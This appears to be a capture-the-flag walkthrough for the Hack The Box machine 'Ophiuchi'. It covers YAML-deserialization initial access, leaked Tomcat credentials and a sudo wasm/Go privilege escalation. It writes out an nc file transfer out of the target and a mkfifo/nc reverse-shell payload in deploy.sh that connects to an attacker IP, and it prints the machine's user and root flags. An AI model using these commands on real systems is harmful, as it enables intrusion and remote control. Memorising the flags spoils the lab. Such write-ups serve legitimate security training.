ophiuchi | 10.10.10.227 | HTB

open ports
----------
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.38

* visiting the port 8080 on browser shows a YAML parser search for vulnerability and found a medium page explaining the yaml parser vulnerability in the java code 
* clone the github repository and follow the steps
* create a revrese shell and save it as revshell .sh and save it in a directory
* follow the steps in the github repository to generate a payload 
* start a python server on the directory same as the revshell.sh and java payload
* start an nc listener 
* execute the yaml parser code with out IP in the web ui and we have a shell
* now we are tomcat user on te machine 
* move to /opt and found the credentials for the ssh 

<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
	version="1.0">
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>

* found the credentials for the admin user
   
   admin : whythereisalimit

* ssh into the box as admin and we have the user flag
 
-------------------------------------------
user.txt : e72051b92e12b434d48103ca4f6f77f5
-------------------------------------------

* check sudo -l and we can see 
(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go

admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
panic: runtime error: index out of range [0] with length 0
-

goroutine 1 [running]:
github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports.func1(0x0, 0x0, 0xc000045c90, 0x5d1200, 0x200000003)
	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:94 +0x201
github.com/wasmerio/wasmer-go/wasmer.newInstanceWithImports(0xc00000e060, 0xc000045d48, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc000045d70)
	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:137 +0x1d3
github.com/wasmerio/wasmer-go/wasmer.NewInstanceWithImports(0x0, 0x0, 0x0, 0xc00000e060, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, ...)
	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:87 +0xa6
github.com/wasmerio/wasmer-go/wasmer.NewInstance(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4e6180, 0x1)
	/root/go/src/github.com/wasmerio/wasmer-go/wasmer/instance.go:82 +0xc9
main.main()
	/opt/wasm-functions/index.go:14 +0x6d
exit status 2

admin@ophiuchi:~$ cat /opt/wasm-functions/index.go
package main
-
import (
	"fmt"
	wasm "github.com/wasmerio/wasmer-go/wasmer"
	"os/exec"
	"log"
)


func main() {
	bytes, _ := wasm.ReadBytes("main.wasm")

	instance, _ := wasm.NewInstance(bytes)
	defer instance.Close()
	init := instance.Exports["info"]
	result,_ := init()
	f := result.String()
	if (f != "1") {
		fmt.Println("Not ready to deploy")
	} else {
		fmt.Println("Ready to deploy")
		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}

admin@ophiuchi:~$ find / -type f -name main.wasm 2>/dev/null
/opt/wasm-functions/main.wasm
/opt/wasm-functions/backup/main.wasm
-
* download the tools from github to convert wasm to wat and wat to wasm
* wasm2wat , wat2wasm
* sending the file main.wasm to attacker machine
nc -lvnp 9001 > main.wasm
cat main.wasm | nc 10.10.16.22 9001

* convert main.wasm to wain.wat and change the info function result from 0 to 1 
* convert it back to main.wasm
* mkdir .lord on the admin home
* send the coverted file to the victim machine (python server)
* edit the deploy.sh script with an nc reverse shell
* save both main.wasm and deploy.sh in the .lord directory 
* run the sudo command and we are root

admin@ophiuchi:~/.lord$ nano deploy.sh 
admin@ophiuchi:~/.lord$ ls
deploy.sh  main.wasm
admin@ophiuchi:~/.lord$ cat deploy.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.22 9001 >/tmp/f
admin@ophiuchi:~/.lord$ sudo /usr/bin/go run /opt/wasm-functions/index.go

┌──(root💀kali)-[~/Downloads/HTB/Ophiuchi]
└─# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.10.227] 35874
# ls
deploy.sh
main.wasm
# cd /root
# cat /root/root.txt
47b72353924ec352736d9e154df22522
# 

-------------------------------------------
user.txt : e72051b92e12b434d48103ca4f6f77f5
-------------------------------------------
-------------------------------------------
root.txt : 47b72353924ec352736d9e154df22522
-------------------------------------------